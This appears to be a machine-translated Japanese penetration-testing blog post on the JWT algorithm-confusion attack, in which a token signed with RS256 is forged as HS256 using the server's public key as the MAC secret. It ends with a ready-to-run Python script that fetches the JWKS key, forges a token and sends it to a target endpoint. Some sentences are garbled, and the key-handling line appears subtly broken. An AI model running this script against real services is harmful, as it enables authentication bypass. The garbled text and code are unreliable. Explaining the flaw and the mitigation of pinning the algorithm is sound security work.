前回のペンテストで、JSON Web Token（または単にJWT）に基づく認証スキームに遭遇しました。 JWTは、ヘッダー、ペイロード、検証情報の3つの部分で構成されています。ヘッダーの最初の部分にはアルゴリズムの名前が含まれ、後でJWTの検証部分に使用されます。攻撃者がこの情報を変更し、サーバーが検証に使用するスキームを（場合によっては）制御できるため、これは危険です。

通常、RS256（デジタル署名アルゴリズム）とHS256（MACベースのアルゴリズム）の2つのスキームが使用されます。完全に安全でないオプションはNULLスキームです。検証情報をまったく含めないでください-残念ながら、NULLスキームはターゲットWebサーバーによって受け入れられませんでした。サーバー実装が検証（トークン、キー）などのコードを単に呼び出す検証ライブラリーを使用し、デジタル署名されたトークンのみが使用されることを想定している場合に機能する可能性のあるJWT

攻撃の小さなバリエーションtype confusion。この場合、2番目のパラメーター「key」は常に公開され、検証のために提示されます（デジタル署名は秘密鍵を使用して署名を作成し、対応する公開鍵を使用して作成された署名を検証します）。

これで攻撃者は公開鍵を取得し、新しいMACベースのトークンを作成し、それを使用してこのトークンの検証の一部を作成できます。 MACベースのスキームでは、検証情報を作成するために必要なのは秘密鍵だけなので、攻撃者は公開鍵（デジタル署名）をMACの秘密鍵として使用します。このトークンが検証のためにサーバーに渡されると、ライブラリはトークンに使用されるスキーム（攻撃者によってHS256として設定され、MACスキームを指す）を識別します。ライブラリは、MACを作成するための入力として2番目のパラメーターを使用します。これは公開鍵であるため、新しいMACは攻撃者に送信されたMACと一致し、一致するため、サーバーは偽のトークンを受け入れます。次に、アプリケーション開発者は何をすべきですか？トークンがサーバーによって受け入れられた場合、サーバーは常に、使用されたアルゴリズムが開発者によって最初に計画されたものと一致するかどうかを常に確認する必要があります。

理論的には、これは簡単に確認できるはずですが、機能するツールは見つかりませんでした。したがって、私自身がpythonスクリプトを作成しました。これを使用するには、ソースコードで次の構成を使用する必要があります。

  • jwks_url：公開鍵に関する情報はどこで入手できますか。JWKSは、主要な情報を公開するために多くのサービスで使用されています。
  • operation_url：承認にJWTトークンを使用するHTTP GETリクエスト。
  • token：構成された操作に有効なJWT。
  • audience：トークンが構成された対象ユーザー。

戻りステータスコード（変更されたトークンを含む）が401（認証は禁止されている）だったので、ターゲットサーバー側の認証チェックが機能し、signature-vs-mac攻撃によって侵害されませんでした。これが機能する場合、両方のHTTP呼び出しで（元のトークンと変更されたトークンを使用して）同一のステータスコードと同様の結果のドキュメントが作成されます。

この記事があなたのペンテストの練習に役立つことを願っています。Pythonスクリプトを喜んで使用してください：

import jwt
import requests

from jwcrypto import jwk
from cryptography.x509 import load_pem_x509_certificate
from cryptography.hazmat.backends import default_backend

# configuration
jwks_url = "https://localhost/oauth2/.well-known/jwks.json"
operation_url = "https://localhost/web/v1/user/andy"
audience = "https://localhost"
token = "eyJh..."

# retrieves key from jwks
def retrieve_jwks(url):
    r = requests.get(url)
    if r.status_code == 200:
        for key in r.json()['keys']:
            if key['kty'] == "RSA":
                return jwk.JWK(**key)
        print("no usable RSA key found")
    else:
        print("could not retrieve JWKS: HTTP status code " + str(r.status_code))

def extract_payload(token, public_key, audience):
    return jwt.decode(token, public_key, audience=audience, algorithms='RS256')

def retrieve_url(url, token):
    header = {'Authorization' : "Bearer " + token}
    return requests.get(url, headers=header)

# call the original operation and output it's results
original = retrieve_url(operation_url, token)
print("original: status: " + str(original.status_code) + "\nContent: " + str(original.json()))

# get key and extract the original payload (verify it during decoding to make
# sure that we have the right key, also verify the audience claim)
public_key = retrieve_jwks(jwks_url).export_to_pem()
payload = extract_payload(token, public_key, audience)
print("(verified) payload: " + str(payload))

# create a new token based upon HS256, cause the jwt library checks this
# to prevent against confusion attacks.. that we actually try to do (:
mac_key = str(public_key).replace("PUBLIC", "PRIVATE")
hs256_token = jwt.encode(payload, key=mac_key, algorithm="HS256")

# call the operation with the new token
modified = retrieve_url(operation_url, str(hs256_token))
print("modified: status: " + str(modified.status_code) + "\nContent: " + str(modified.json()))
